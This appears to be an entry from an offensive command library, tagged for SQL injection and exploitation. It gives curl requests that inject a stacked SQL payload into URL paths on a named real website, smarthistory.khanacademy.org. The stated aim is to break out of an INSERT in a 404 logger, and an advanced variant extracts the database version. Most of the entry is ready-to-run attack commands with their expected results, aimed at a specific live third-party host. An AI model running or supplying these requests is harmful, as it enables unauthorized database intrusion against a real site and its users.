---
id: cmd-uuid-2
data: >-
  curl -X GET "http://smarthistory.khanacademy.org/Campin/qsdqsd',(SELECT
  1),1,1,1)#" -H "Host: smarthistory.khanacademy.org" --connect-timeout 30
tags:
  - sqli
  - exploitation
type: command
output: >-
  HTTP/1.1 503 Service Unavailable or modified SQL error indicating stacked
  execution
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.398Z'
verified: false
validated: true
submitted: true
---
# attempt-stacked-sql-injection-in-url

## Command

```bash
curl -X GET "http://smarthistory.khanacademy.org/Campin/qsdqsd',(SELECT 1),1,1,1)#" -H "Host: smarthistory.khanacademy.org" --connect-timeout 30
```

## Description

Attempts a stacked SQL injection by injecting a payload that closes the INSERT and adds a new query, testing for arbitrary SQL execution in the 404 logger.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Path | URL with stacked payload (e.g., /Campin/qsdqsd',(SELECT 1),1,1,1)#) | Yes |
| Host | Target domain | Yes |
| --connect-timeout | Extended timeout for slow server responses | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/path',(SELECT 1),1)#" -H "Host: target.com"
```

### Advanced Usage

```bash
curl -X GET "http://smarthistory.khanacademy.org/Campin/qsdqsd',(SELECT version()),1,1,1)#" -H "Host: smarthistory.khanacademy.org" --connect-timeout 30 -v
```

## Expected Output

Response with no syntax error or database version info if successful; otherwise, timeout or 503 error due to rate limiting.

## Related

- [[Related Procedure: Confirm-SQL-Injection-with-Stacked-Queries]]
